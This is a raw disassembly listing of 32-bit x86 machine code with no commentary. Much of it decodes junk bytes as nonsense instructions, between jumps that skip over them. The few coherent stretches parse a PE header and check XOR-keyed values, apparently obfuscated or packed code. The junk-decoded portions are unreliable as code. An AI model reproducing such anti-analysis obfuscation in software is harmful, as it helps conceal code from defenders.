  40f2b2:	out    dx,al
  40f2b3:	sub    BYTE PTR [edi],ah
  40f2b5:	mov    eax,0xe8690f7a
  40f2ba:	(bad)  
  40f2bb:	xor    DWORD PTR [eax+eax*4],ecx
  40f2be:	mov    edx,0xab3199e0
  40f2c3:	push   0xffffff99
  40f2c5:	mov    esp,0x1e8900c7
  40f2ca:	xor    al,0x60
  40f2cc:	jmp    0x40f7b6
  40f2d1:	mov    eax,DWORD PTR [ebp+0x8]
  40f2d4:	mov    ecx,DWORD PTR [ebp-0x8]
  40f2d7:	xor    eax,esi
  40f2d9:	add    eax,edi
  40f2db:	cmp    DWORD PTR [ecx],eax
  40f2dd:	je     0x40f79e
  40f2e3:	mov    ecx,DWORD PTR [ebp-0x18]
  40f2e6:	jmp    0x40f450
  40f2eb:	dec    ebx
  40f2ec:	int3   
  40f2ed:	cmp    esi,ecx
  40f2ef:	mov    ecx,0x99494bcd
  40f2f4:	add    dh,ch
  40f2f6:	sar    BYTE PTR [ebx-0x4b],1
  40f2f9:	repnz sub BYTE PTR [esi-0x57],dh
  40f2fd:	jo     0x40f36f
  40f2ff:	ret    
  40f300:	jg     0x40f372
  40f302:	jo     0x40f2ce
  40f304:	vpmuludq ymm3,ymm4,YMMWORD PTR [ebx-0x4d]
  40f309:	jecxz  0x40f2ff
  40f30b:	xor    al,BYTE PTR [edi]
  40f30d:	ret    
  40f30e:	mov    ecx,0x619fe661
  40f313:	sti    
  40f314:	inc    esp
  40f315:	push   esi
  40f316:	popa   
  40f317:	pop    ss
  40f318:	jg     0x40f334
  40f31a:	mov    bh,BYTE PTR [edx+esi*2+0x764fc125]
  40f321:	pusha  
  40f322:	out    0x61,eax
  40f324:	pop    ebp
  40f325:	push   ds
  40f326:	push   eax
  40f327:	and    DWORD PTR [ecx+0x50],esp
  40f32a:	mov    ecx,DWORD PTR [edi+0x69]
  40f32d:	xlat   BYTE PTR ds:[ebx]
  40f32e:	clc    
  40f32f:	mov    dl,0xb
  40f331:	rcl    eax,1
  40f333:	and    BYTE PTR [edi],ah
  40f335:	push   esi
  40f336:	lea    edi,[edx]
  40f338:	leave  
  40f339:	mov    esp,0xc4b6488b
  40f33e:	or     al,0x89
  40f340:	outs   dx,BYTE PTR ds:[esi]
  40f341:	dec    ecx
  40f342:	xlat   BYTE PTR ds:[ebx]
  40f343:	fxtract 
  40f345:	sbb    eax,0x3d52b01a
  40f34a:	add    ah,BYTE PTR ds:0x1d904016
  40f350:	in     al,0x17
  40f352:	inc    BYTE PTR [ebp+0x702805ff]
  40f358:	icebp  
  40f359:	jmp    0x9706:0x40d7ab87
  40f360:	jmp    0x40f3c2
  40f362:	inc    edx
  40f363:	cmc    
  40f364:	data16 es cld 
  40f367:	or     eax,edi
  40f369:	repz (bad) 
  40f36b:	cld    
  40f36c:	aaa    
  40f36d:	mov    al,ds:0xcd67f2ac
  40f372:	cdq    
  40f373:	leave  
  40f374:	(bad)  
  40f375:	pop    esi
  40f376:	mov    cl,ch
  40f378:	pop    ss
  40f379:	add    cl,BYTE PTR [edx]
  40f37b:	mov    bh,0xb5
  40f37d:	mov    bh,0x73
  40f37f:	jae    0x40f400
  40f381:	in     eax,dx
  40f382:	xchg   ecx,eax
  40f383:	jbe    0x40f388
  40f385:	mov    ecx,0x29b32576
  40f38a:	call   0x5db2:0xd52f5017
  40f391:	inc    ebp
  40f392:	xor    BYTE PTR [edi+0x4c],bl
  40f395:	jl     0x40f380
  40f397:	(bad)  
  40f399:	outs   dx,DWORD PTR ds:[esi]
  40f39a:	pop    es
  40f39b:	rol    DWORD PTR [ecx-0x29],0x1f
  40f39f:	xor    dh,ah
  40f3a1:	xchg   DWORD PTR [ebp-0x2fc8605d],ebp
  40f3a7:	cmp    eax,0x1cbd21eb
  40f3ac:	mov    BYTE PTR [ebp+0x42],ah
  40f3af:	cld    
  40f3b0:	stos   DWORD PTR es:[edi],eax
  40f3b1:	push   ebp
  40f3b2:	jns    0x40f38b
  40f3b4:	scas   al,BYTE PTR es:[edi]
  40f3b5:	add    BYTE PTR [esi+0x69],ch
  40f3b8:	mov    WORD PTR [ebx+0xb],ds
  40f3bb:	stos   DWORD PTR es:[edi],eax
  40f3bc:	test   eax,0x209454db
  40f3c1:	jno    0x40f34e
  40f3c3:	jns    0x40f3f7
  40f3c5:	cmp    esp,DWORD PTR [esi]
  40f3c7:	fpatan 
  40f3c9:	xchg   esp,eax
  40f3ca:	inc    ebp
  40f3cb:	inc    esp
  40f3cc:	pop    edx
  40f3cd:	hlt    
  40f3ce:	mov    ch,0x6a
  40f3d0:	dec    edx
  40f3d1:	dec    ecx
  40f3d2:	repz stc 
  40f3d4:	xor    ecx,eax
  40f3d6:	fcom   DWORD PTR [ecx]
  40f3d8:	mov    esp,?
  40f3da:	stc    
  40f3db:	and    bl,BYTE PTR [esi]
  40f3dd:	xchg   ebx,eax
  40f3de:	sub    bh,BYTE PTR [esi]
  40f3e0:	or     edi,DWORD PTR [ebx+esi*4+0x5b48ee18]
  40f3e7:	outs   dx,BYTE PTR ds:[esi]
  40f3e8:	jecxz  0x40f43c
  40f3ea:	(bad)  
  40f3ec:	jnp    0x40f3d7
  40f3ee:	ret    0x33b6
  40f3f1:	ror    DWORD PTR [ecx-0x136c14d2],1
  40f3f7:	or     edi,ecx
  40f3f9:	in     eax,dx
  40f3fa:	push   ebp
  40f3fb:	mov    BYTE PTR [ecx],al
  40f3fd:	or     DWORD PTR [ebp-0x218e73d],ebx
  40f403:	mov    cl,0x14
  40f405:	pop    eax
  40f406:	mov    DWORD PTR [esi],ecx
  40f408:	pavgb  mm4,QWORD PTR [eax]
  40f40b:	addr16 fwait
  40f40d:	leave  
  40f40e:	cmp    BYTE PTR cs:[edi+0x40],bl
  40f412:	ror    BYTE PTR [eax],1
  40f414:	adc    al,0x34
  40f416:	mov    eax,ds:0xbe56db1b
  40f41b:	xor    edx,DWORD PTR [edx+esi*1]
  40f41e:	add    BYTE PTR [eax],ah
  40f420:	retf   
  40f421:	dec    eax
  40f422:	sub    eax,0x2c8b90d
  40f427:	call   0x99dc1cd8
  40f42c:	jge    0x40f488
  40f42e:	push   es
  40f42f:	and    ah,BYTE PTR [eax]
  40f431:	mov    eax,ds:0xda5ae231
  40f436:	mov    DWORD PTR [ebx+0x71],edi
  40f439:	push   esp
  40f43a:	pop    ecx
  40f43b:	xor    eax,0xbaedcbfc
  40f440:	mov    esi,0x77135717
  40f445:	inc    eax
  40f446:	adc    eax,0x48e8e950
  40f44b:	and    bl,BYTE PTR [ecx*2+0x458bfca4]
  40f452:	clc    
  40f453:	jmp    0x40f5bd
  40f458:	inc    eax
  40f459:	gs ror ch,cl
  40f45c:	icebp  
  40f45d:	imul   edx,DWORD PTR [ebx+0x65],0x2966c4cb
  40f464:	ins    DWORD PTR es:[edi],dx
  40f465:	mov    cl,0x9c
  40f467:	mov    ah,0x39
  40f469:	mov    bh,0x70
  40f46b:	jo     0x40f430
  40f46d:	jg     0x40f4df
  40f46f:	jo     0x40f4b9
  40f471:	mov    ch,0x92
  40f473:	add    ch,BYTE PTR [edi-0x7aed3688]
  40f479:	in     eax,0x16
  40f47b:	cs sbb eax,0x3fcbe37a
  40f481:	cld    
  40f482:	or     eax,0x1c553d03
  40f487:	lds    esi,FWORD PTR ds:0xcc7beab8
  40f48d:	push   ds
  40f48e:	ins    DWORD PTR es:[edi],dx
  40f48f:	push   ds
  40f490:	ror    BYTE PTR [eax-0x5d3f3e54],0x6f
  40f497:	sti    
  40f498:	dec    eax
  40f499:	pushf  
  40f49a:	mov    dh,0xa2
  40f49c:	mov    esp,0x7f1c6505
  40f4a1:	mov    BYTE PTR [ebx+ecx*2],dh
  40f4a4:	add    edi,ecx
  40f4a6:	xchg   ebp,eax
  40f4a7:	and    ebx,DWORD PTR [ecx+0x644f3e88]
  40f4ad:	add    dh,ch
  40f4af:	out    dx,eax
  40f4b0:	mov    ecx,0x50e78152
  40f4b5:	gs jg  0x40f4e0
  40f4b8:	sbb    BYTE PTR [ecx+0x31],dl
  40f4bb:	push   ebx
  40f4bc:	jmp    0x40f4c0
  40f4be:	outs   dx,BYTE PTR ds:[esi]
  40f4bf:	adc    BYTE PTR [edi+0x29605e58],ch
  40f4c5:	sub    bl,dh
  40f4c7:	enter  0x1b9a,0x34
  40f4cb:	cmp    esi,DWORD PTR [ebx+0x5970138b]
  40f4d1:	cwde   
  40f4d2:	push   eax
  40f4d3:	mov    DWORD PTR [edx+0x6d308ff7],esp
  40f4d9:	shr    BYTE PTR [eax+edi*4-0x2f],cl
  40f4dd:	das    
  40f4de:	sub    al,0x7a
  40f4e0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40f4e1:	adc    al,bl
  40f4e3:	imul   bl
  40f4e5:	out    dx,al
  40f4e6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40f4e7:	jmp    0x40f488
  40f4e9:	dec    ebp
  40f4ea:	pop    ds
  40f4eb:	mov    edx,0x9349afc7
  40f4f0:	div    ebp
  40f4f2:	dec    esi
  40f4f3:	mov    ebx,0xfd620ecd
  40f4f8:	popf   
  40f4f9:	out    0xa6,eax
  40f4fb:	test   al,0x86
  40f4fd:	rol    DWORD PTR [esp+edi*2+0x63],cl
  40f501:	clc    
  40f502:	imul   ebx,esp,0x66
  40f505:	js     0x40f488
  40f507:	fwait
  40f508:	outs   dx,BYTE PTR ds:[esi]
  40f509:	sub    al,0x8c
  40f50b:	cmps   DWORD PTR es:[esi],DWORD PTR es:[edi]
  40f50d:	pop    ebx
  40f50e:	aaa    
  40f50f:	cmp    BYTE PTR [edi+0x7992a000],dh
  40f515:	mov    bl,0x79
  40f517:	out    dx,eax
  40f518:	(bad)  
  40f519:	xor    eax,DWORD PTR [ebp+esi*4+0x7d]
  40f51d:	mov    cl,0xc
  40f51f:	jp     0x40f53c
  40f521:	cld    
  40f522:	pop    eax
  40f523:	call   0x83de693c
  40f528:	arpl   WORD PTR [ecx-0x43],cx
  40f52b:	push   ss
  40f52c:	adc    bh,BYTE PTR [esi+0x674478f8]
  40f532:	pusha  
  40f533:	mov    ah,0x87
  40f535:	push   0x8c6d4818
  40f53a:	dec    ecx
  40f53b:	jbe    0x40f5b1
  40f53d:	sbb    al,0xf8
  40f53f:	ficom  WORD PTR [esi-0x61]
  40f542:	lea    edx,[eax+0x1e90f5dc]
  40f548:	jecxz  0x40f57f
  40f54a:	sub    al,0x7f
  40f54c:	push   eax
  40f54d:	ds ins DWORD PTR es:[edi],dx
  40f54f:	xchg   ecx,eax
  40f550:	mov    ecx,0xfef1c5d7
  40f555:	sar    ah,0xe5
  40f558:	mov    ecx,0x6fc2f5b5
  40f55d:	mov    ch,0xa1
  40f55f:	mov    edi,0xd80ff185
  40f564:	loop   0x40f518
  40f566:	out    dx,eax
  40f567:	cmp    edi,DWORD PTR [eax]
  40f569:	mov    ecx,DWORD PTR [esi+0x159f909e]
  40f56f:	clc    
  40f570:	sub    cl,BYTE PTR ds:0x30ad1e5c
  40f576:	cmc    
  40f577:	add    eax,0xa8327851
  40f57c:	fisubr DWORD PTR [edi+0x57314c55]
  40f582:	out    0x38,al
  40f584:	shr    ecx,cl
  40f586:	or     eax,0x6b8e07cf
  40f58b:	out    0xa0,al
  40f58d:	daa    
  40f58e:	xchg   edi,eax
  40f58f:	or     bh,BYTE PTR [eax-0x3f]
  40f592:	push   esi
  40f593:	daa    
  40f594:	xchg   edx,eax
  40f595:	xlat   BYTE PTR ds:[ebx]
  40f596:	imul   BYTE PTR [eax]
  40f598:	jmp    0xb425:0x541e296b
  40f59f:	cli    
  40f5a0:	pop    esi
  40f5a1:	fisttp QWORD PTR [eax]
  40f5a3:	fiadd  DWORD PTR [esi+0x79dfb45a]
  40f5a9:	push   0xeeb2ee0f
  40f5ae:	in     eax,0x6
  40f5b0:	xor    esp,esi
  40f5b2:	add    eax,0xb49d85ac
  40f5b7:	div    BYTE PTR [ecx+0x79]
  40f5ba:	push   es
  40f5bb:	nop
  40f5bc:	dec    esi
  40f5bd:	mov    eax,DWORD PTR [eax]
  40f5bf:	mov    eax,DWORD PTR [eax+0x3c]
  40f5c2:	lea    ecx,[ecx*8+0x78]
  40f5c9:	add    eax,ecx
  40f5cb:	mov    ecx,DWORD PTR [ebp-0x8]
  40f5ce:	mov    ecx,DWORD PTR [ecx]
  40f5d0:	mov    eax,DWORD PTR [eax+ecx*1]
  40f5d3:	mov    DWORD PTR [ebp-0x20],eax
  40f5d6:	mov    eax,DWORD PTR [ebp+0x8]
  40f5d9:	xor    eax,esi
  40f5db:	add    eax,edi
  40f5dd:	mov    DWORD PTR [ebp-0x24],eax
  40f5e0:	mov    eax,DWORD PTR [ebp+0x8]
  40f5e3:	mov    ecx,DWORD PTR [ebp-0x20]
  40f5e6:	xor    eax,esi
  40f5e8:	add    eax,edi
  40f5ea:	cmp    ecx,eax
  40f5ec:	je     0x40f7b6
  40f5f2:	jmp    0x40f75c
  40f5f7:	pop    ebx
  40f5f8:	out    dx,al
  40f5f9:	dec    ebp
  40f5fa:	mov    bl,0x49
  40f5fc:	mov    bl,0x61
  40f5fe:	test   BYTE PTR [edx+0xc],0x5a
  40f602:	dec    ebx
  40f603:	sbb    DWORD PTR [ebx-0x49734597],esp
  40f609:	jo     0x40f67b
  40f60b:	ret    
  40f60c:	jg     0x40f67e
  40f60e:	jo     0x40f609
  40f610:	inc    edx
  40f611:	mov    ecx,0x470536c4
  40f616:	jbe    0x40f659
  40f618:	adc    eax,0xe89aca1f
  40f61d:	arpl   ax,di
  40f61f:	ss cmc 
  40f621:	cmp    eax,0xe066f349
  40f626:	xchg   BYTE PTR [ebp+0xd],bl
  40f629:	xor    ah,BYTE PTR [edx-0x2c1115dc]
  40f62f:	rcl    BYTE PTR [edx],cl
  40f631:	push   ebp
  40f632:	pop    edx
  40f633:	cmp    DWORD PTR [eax],ecx
  40f635:	adc    bl,0xf
  40f638:	rcr    al,cl
  40f63a:	je     0x40f672
  40f63c:	sahf   
  40f63d:	jg     0x40f69a
  40f63f:	in     eax,dx
  40f640:	retf   
  40f641:	or     eax,0x14d330fd
  40f646:	xchg   ebp,eax
  40f647:	gs out dx,eax
  40f649:	sti    
  40f64a:	test   dl,cl
  40f64c:	cli    
  40f64d:	xor    dh,ch
  40f64f:	ins    DWORD PTR es:[edi],dx
  40f650:	rol    BYTE PTR [ebp+0xef8f58],0x4d
  40f657:	clc    
  40f658:	sub    eax,0x5d9b0b58
  40f65d:	jmp    0x40f5f3
  40f65f:	inc    edx
  40f660:	add    esp,edi
  40f662:	lods   al,BYTE PTR ds:[esi]
  40f663:	in     al,dx
  40f664:	xor    DWORD PTR [esi-0x7f],esp
  40f667:	push   ebp
  40f668:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40f669:	jmp    0x1eef841b
  40f66e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40f66f:	mov    fs,esp
  40f671:	or     BYTE PTR [edi],bl
  40f673:	lock mov edi,0xcca60b2a
  40f679:	addr16 xchg edx,eax
  40f67b:	push   cs
  40f67c:	ins    DWORD PTR es:[edi],dx
  40f67d:	adc    edx,eax
  40f67f:	xchg   ebp,eax
  40f680:	mov    edi,0x204280b5
  40f685:	cld    
  40f686:	adc    esp,DWORD PTR [edx-0x1e6355f8]
  40f68c:	add    ebp,DWORD PTR [eax+0x62]
  40f68f:	pushf  
  40f690:	sti    
  40f691:	push   ebp
  40f692:	jl     0x40f69b
  40f694:	jo     0x40f65f
  40f696:	int3   
  40f697:	mov    esp,0x5a46aba7
  40f69c:	test   BYTE PTR [ebp+esi*4+0x33fc5bc3],dh
  40f6a3:	adc    ebx,DWORD PTR [ebx+0x74]
  40f6a6:	dec    ecx
  40f6a7:	cmc    
  40f6a8:	xchg   edi,eax
  40f6a9:	test   DWORD PTR [edx-0x42edb7b],edx
  40f6af:	jmp    FWORD PTR [ebx+0x13c54990]
  40f6b5:	(bad)  
  40f6b6:	ins    DWORD PTR es:[edi],dx
  40f6b7:	int3   
  40f6b8:	sbb    al,0x69
  40f6ba:	dec    ebx
  40f6bb:	fisubr WORD PTR [edx+eax*2-0x80]
  40f6bf:	pop    ebp
  40f6c0:	xor    eax,0xef78e12e
  40f6c5:	arpl   di,cx
  40f6c7:	and    eax,0x2bc9e578
  40f6cc:	adc    BYTE PTR [esi+0x28],ah
  40f6cf:	out    dx,eax
  40f6d0:	cmc    
  40f6d1:	int    0x89
  40f6d3:	cs push edi
  40f6d5:	pushf  
  40f6d6:	push   ds
  40f6d7:	ds or  ch,bl
  40f6da:	repnz mov esp,0x3fff667c
  40f6e0:	pmulhw mm6,mm7
  40f6e3:	jae    0x40f745
  40f6e5:	lds    edx,FWORD PTR ds:0xa9b4dbf
  40f6eb:	ds into 
  40f6ed:	sbb    DWORD PTR [eax+0x3cc7f2bd],ebp
  40f6f3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40f6f4:	mov    ecx,0x749d0302
  40f6f9:	enter  0x90e6,0x3d
  40f6fd:	jnp    0x40f759
  40f6ff:	mov    DWORD PTR fs:[ebx+0x4a],ebx
  40f703:	repz fadd QWORD PTR [ebp-0x6a239383]
  40f70a:	stos   DWORD PTR es:[edi],eax
  40f70b:	out    0x34,eax
  40f70d:	aas    
  40f70e:	push   esi
  40f70f:	pop    ecx
  40f710:	test   ebx,0x3aa43112
  40f716:	dec    ebp
  40f717:	pop    eax
  40f718:	jp     0x40f754
  40f71a:	pop    ebx
  40f71b:	pop    edi
  40f71c:	adc    bl,BYTE PTR [edi-0x6e3447e1]
  40f722:	and    cl,dl
  40f724:	and    al,0xa5
  40f726:	dec    edi
  40f727:	(bad)  
  40f728:	xor    ebx,ebp
  40f72a:	sbb    eax,0x6e2127b5
  40f72f:	or     eax,0xa508d3b7
  40f734:	fwait
  40f735:	mov    eax,0xf8d35a5
  40f73a:	xchg   BYTE PTR [esi+ecx*2],dh
  40f73d:	pop    esi
  40f73e:	pop    ebp
  40f73f:	test   al,bl
  40f741:	push   cs
  40f742:	cmp    DWORD PTR [edx],eax
  40f744:	mov    al,0xa3
  40f746:	loop   0x40f7be
  40f748:	jae    0x40f727
  40f74a:	sbb    BYTE PTR ds:0x76225a4c,bl
  40f750:	dec    eax
  40f751:	xchg   ecx,eax
  40f752:	mov    ds:0x6ffd61c6,eax
  40f757:	mov    edi,0x3ceefb9
  40f75c:	mov    eax,DWORD PTR [ebp-0x8]
  40f75f:	mov    ecx,DWORD PTR [ebp-0x20]
  40f762:	add    ecx,DWORD PTR [eax]
  40f764:	mov    DWORD PTR [ebp-0x24],ecx
  40f767:	mov    eax,DWORD PTR [ebp-0x24]
  40f76a:	mov    ecx,DWORD PTR [ebp-0x8]
  40f76d:	mov    eax,DWORD PTR [eax+0xc]
  40f770:	mov    ecx,DWORD PTR [ecx]
  40f772:	mov    al,BYTE PTR [eax+ecx*1]
  40f775:	add    al,0x37
  40f777:	xor    al,0x47
  40f779:	cmp    al,0xc5
  40f77b:	je     0x40f792
  40f781:	mov    eax,DWORD PTR [ebp+0x8]
  40f784:	mov    ecx,DWORD PTR [ebp-0x8]
  40f787:	xor    eax,esi
  40f789:	add    eax,edi
  40f78b:	mov    DWORD PTR [ecx],eax
  40f78d:	jmp    0x40f7b6
  40f792:	xor    DWORD PTR [ebp-0xc],0x5fd8f
  40f799:	jmp    0x40f7b6
  40f79e:	mov    eax,DWORD PTR [ebp-0x8]
  40f7a1:	mov    ecx,DWORD PTR [ebp-0x1c]
  40f7a4:	mov    ecx,DWORD PTR [ecx]
  40f7a6:	mov    DWORD PTR [eax],ecx
  40f7a8:	mov    eax,DWORD PTR [ebp+0xc]
  40f7ab:	mov    eax,DWORD PTR [ebp+0x8]
  40f7ae:	push   DWORD PTR [ebp-0x8]
  40f7b1:	call   0x401000
  40f7b6:	mov    eax,DWORD PTR [ebp-0xc]
  40f7b9:	cmp    eax,ebx
  40f7bb:	je     0x40e863
  40f7c1:	mov    eax,DWORD PTR [ebp-0x8]
  40f7c4:	mov    eax,DWORD PTR [eax]
  40f7c6:	pop    edi
  40f7c7:	pop    esi
  40f7c8:	pop    ebx
  40f7c9:	leave  
  40f7ca:	ret    0x8
  40f7cd:	push   ebp
  40f7ce:	mov    ebp,esp
  40f7d0:	jmp    0x40fb9a
  40f7d5:	ds cmp al,0x79
  40f7d8:	adc    BYTE PTR [ecx-0x23],bh
  40f7db:	(bad)  
  40f7dd:	dec    ebp
  40f7de:	xor    eax,0x47c346f3
  40f7e3:	imul   ecx,DWORD PTR [edi+ebx*2],0xffffffb5
  40f7e7:	jo     0x40f859
  40f7e9:	mov    ds:0x9570707d,eax
  40f7ee:	adc    DWORD PTR [ecx+0x32],esp
  40f7f1:	jo     0x40f7fb
  40f7f3:	mov    edx,0x44bd8c4d
  40f7f8:	jl     0x40f842
  40f7fa:	lds    edx,FWORD PTR es:[ebp-0x72f39dbe]
  40f801:	mov    dh,0xfc
  40f803:	cmp    DWORD PTR [ecx+ebx*2+0x1c76ded5],ecx
  40f80a:	or     eax,0x9c8190a2
  40f80f:	pop    edx
  40f810:	aam    0xa0
  40f812:	mov    ecx,0xd4a78a9f
  40f817:	sub    BYTE PTR [ebp-0x2f4a8d58],bl
  40f81d:	or     DWORD PTR [ebx+0x45cb5203],ebp
  40f823:	ss cs sub ebp,ebp
  40f827:	mov    eax,0x3d844eba
  40f82c:	adc    esi,DWORD PTR [eax+0x7f]
  40f82f:	outs   dx,DWORD PTR ds:[esi]
  40f830:	cli    
  40f831:	or     edi,esi
  40f833:	inc    esp
  40f834:	pop    eax
  40f835:	int3   
  40f836:	add    eax,0xc2a8757
  40f83b:	jge    0x40f862
  40f83d:	mov    dh,0x45
  40f83f:	and    dl,BYTE PTR [edi+0x57]
  40f842:	pop    ecx
  40f843:	test   eax,0x21fb87c2
  40f848:	fidivr DWORD PTR [edi]
  40f84a:	popf   
  40f84b:	dec    eax
  40f84c:	jmp    0x677931cb
  40f851:	mov    WORD PTR [edi],cs
  40f853:	jge    0x40f84a
  40f855:	xchg   edi,eax
  40f856:	jmp    0xbe67ca1f
  40f85b:	pusha  
  40f85c:	dec    DWORD PTR [esi-0x71a80bd0]
  40f862:	push   ebp
  40f863:	add    bh,cl
  40f865:	test   DWORD PTR [edi-0x5a],ebp
  40f868:	xchg   ecx,eax
  40f869:	(bad)  
  40f86a:	out    0xad,al
  40f86c:	pop    edx
  40f86d:	aas    
  40f86e:	push   ecx
  40f86f:	sbb    ecx,DWORD PTR [ebx-0x58d75c56]
  40f875:	mov    dl,0xdb
  40f877:	push   0xae6b3c01
  40f87c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40f87d:	loope  0x40f8d0
  40f87f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40f880:	jne    0x40f834
  40f882:	outs   dx,DWORD PTR ds:[esi]
  40f883:	sub    ecx,DWORD PTR [edx+0x42]
  40f886:	mov    al,0x44
  40f888:	xor    dl,BYTE PTR [esi+0x0]
  40f88b:	sbb    eax,0xe91346b5
  40f890:	mov    al,ds:0xf1f75ee9
  40f895:	stc    
  40f896:	add    al,0xac
  40f898:	je     0x40f870
  40f89a:	call   0x22f8:0xf63db975
  40f8a1:	xchg   DWORD PTR [ecx+0x74667bd3],eax
  40f8a7:	mov    eax,ds:0xedc4e6a1
  40f8ac:	sbb    eax,edi
  40f8ae:	or     DWORD PTR [eax-0x1151e978],ecx
  40f8b4:	pop    ecx
  40f8b5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40f8b6:	fst    st(5)
  40f8b8:	lahf   
  40f8b9:	nop
  40f8ba:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40f8bb:	push   0xf8378e87
  40f8c0:	sar    BYTE PTR [eax+0x3addc2b2],cl
  40f8c6:	push   0x694e0ada
  40f8cb:	test   DWORD PTR [ebp-0x663ce915],eax
  40f8d1:	outs   dx,DWORD PTR ds:[esi]
  40f8d2:	cs sbb al,0x47
  40f8d5:	idiv   BYTE PTR [edi]
  40f8d7:	js     0x40f8a8
  40f8d9:	mov    ebp,0xbe0a5b53
  40f8de:	adc    DWORD PTR [eax],edx
  40f8e0:	mov    bl,0x25
  40f8e2:	call   0x18944af4
  40f8e7:	sahf   
  40f8e8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40f8e9:	pop    ecx
  40f8ea:	push   eax
  40f8eb:	jbe    0x40f8de
  40f8ed:	and    eax,0xec638dc8
  40f8f2:	mov    ebp,0xbffee6da
  40f8f7:	dec    ecx
  40f8f8:	jns    0x40f90b
  40f8fa:	push   ds
  40f8fb:	rcr    bh,cl
  40f8fd:	xor    al,0x15
  40f8ff:	aas    
  40f900:	cmp    DWORD PTR [ecx],ecx
  40f902:	jle    0x40f979
  40f904:	xor    DWORD PTR [esi],edi
  40f906:	sbb    eax,0xffffff84
  40f909:	jb     0x40f8c5
  40f90b:	sub    DWORD PTR [ecx+0x6d],ecx
  40f90e:	pop    edi
  40f90f:	aam    0x8d
  40f911:	aad    0x7c
  40f913:	dec    eax
  40f914:	pop    ebx
  40f915:	mov    dl,0x6d
  40f917:	xor    al,0x63
  40f919:	aad    0xe5
  40f91b:	(bad)  
  40f91c:	jnp    0x40f984
  40f91e:	stos   DWORD PTR es:[edi],eax
  40f91f:	in     eax,0xa5
  40f921:	dec    eax
  40f922:	lods   eax,DWORD PTR ds:[esi]
  40f923:	dec    edx
  40f924:	dec    esi
  40f925:	imul   edi,ebx,0x858a6802
  40f92b:	lock cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40f92d:	mov    eax,0x34f90171
  40f932:	(bad)  
  40f933:	enter  0xe570,0x97
  40f937:	inc    eax
  40f938:	xor    esp,DWORD PTR [esi]
  40f93a:	push   ebp
  40f93b:	fisub  DWORD PTR [edx+0x30]
  40f93e:	jb     0x40f924
  40f940:	repnz outs dx,BYTE PTR ds:[esi]
  40f942:	mov    ebx,0xb00e6281
  40f947:	dec    eax
  40f948:	jnp    0x40f97a
  40f94a:	xor    al,0x11
  40f94c:	mov    ds:0x44a92ff7,eax
  40f951:	into   
  40f952:	fistp  DWORD PTR [edi-0xde9a982]
  40f958:	xor    cl,cl
  40f95a:	mov    esp,0xc8ea069d
  40f95f:	nop
  40f960:	call   0x64cadbe5
  40f965:	aas    
  40f966:	sbb    eax,0xe0b483a6
  40f96b:	jp     0x40f950
  40f96d:	frstor [eax-0x465b81f2]
  40f973:	je     0x40f90c
  40f975:	addr16 push ss
  40f977:	sbb    BYTE PTR [edi],dl
  40f979:	xor    eax,DWORD PTR [esi-0x27]
  40f97c:	jns    0x40f9f1
  40f97e:	and    al,0x28
  40f980:	lock mov dl,0xb4
  40f983:	arpl   WORD PTR [ebx-0x5668e8a6],dx
  40f989:	cwde   
  40f98a:	sbb    al,0x63
  40f98c:	mov    bl,0x58
  40f98e:	mov    ?,ecx
  40f990:	repnz addr16 hlt 
  40f993:	mov    ebp,0x97ce28e2
  40f998:	retf   0x557b
  40f99b:	sbb    ah,al
  40f99d:	out    0x87,eax
  40f99f:	xlat   BYTE PTR ds:[ebx]
  40f9a0:	sbb    dh,BYTE PTR [ecx]
  40f9a2:	inc    eax
  40f9a3:	icebp  
  40f9a4:	sti    
  40f9a5:	pop    es
  40f9a6:	and    DWORD PTR [esi-0x77],ecx
  40f9a9:	cmc    
  40f9aa:	in     eax,0x56
  40f9ac:	push   ds
  40f9ad:	mov    BYTE PTR [ebx+0x6ebfd817],0xd9
  40f9b4:	jns    0x40f95c
  40f9b6:	lock adc esi,DWORD PTR [edx+0x260f03f8]
  40f9bd:	cmc    
  40f9be:	(bad)  
  40f9bf:	rol    ch,cl
  40f9c1:	out    dx,eax
  40f9c2:	dec    ebx
  40f9c3:	sahf   
  40f9c4:	in     eax,0x1b
  40f9c6:	and    al,0xb1
  40f9c8:	pop    eax
  40f9c9:	rcl    edx,1
  40f9cb:	in     al,0x5f
  40f9cd:	push   0x85c0ed99
  40f9d2:	idiv   BYTE PTR [ecx-0x31de970d]
  40f9d8:	test   eax,0xbb011ce1
  40f9dd:	cmp    BYTE PTR [ebx-0x4ba5d88],bl
  40f9e3:	and    eax,ecx
  40f9e5:	pop    es
  40f9e6:	pop    esi
  40f9e7:	push   ebp
  40f9e8:	push   ebx
  40f9ea:	jmp    DWORD PTR [edx-0x42]
  40f9ed:	mov    bl,0xd3
  40f9ef:	nop
  40f9f0:	mov    ds:0xe5f544e9,al
  40f9f5:	clc    
  40f9f6:	jp     0x40fa15
  40f9f8:	pop    es
  40f9f9:	dec    edx
  40f9fa:	and    BYTE PTR [edx+edi*2+0x3797987d],ch
  40fa01:	cwde   
  40fa02:	pusha  
  40fa03:	inc    esi
  40fa04:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40fa05:	sub    bl,BYTE PTR [ebp+0x57]
  40fa08:	mov    ds:0x8f7ac4d9,eax
  40fa0d:	sar    DWORD PTR [esi+0x7933373d],cl
  40fa13:	mov    ebp,0x8bdd45b
  40fa18:	imul   ebp,eax,0x2a
  40fa1b:	pop    esi
  40fa1c:	mov    dh,0x37
  40fa1e:	out    0xb5,eax
  40fa20:	es (bad) 
  40fa22:	jbe    0x40fa13
  40fa24:	in     al,dx
  40fa25:	sub    bl,BYTE PTR [ebp-0x4094ed]
  40fa2b:	int    0x39
  40fa2d:	fstp   QWORD PTR [ebx]
  40fa2f:	xor    eax,0x8db93ae2
  40fa34:	pop    ebp
  40fa35:	mov    esi,0xd7c085d1
  40fa3a:	adc    ch,dl
  40fa3c:	popa   
  40fa3d:	lgs    edi,FWORD PTR [ecx-0x150bda0d]
  40fa44:	pop    ds
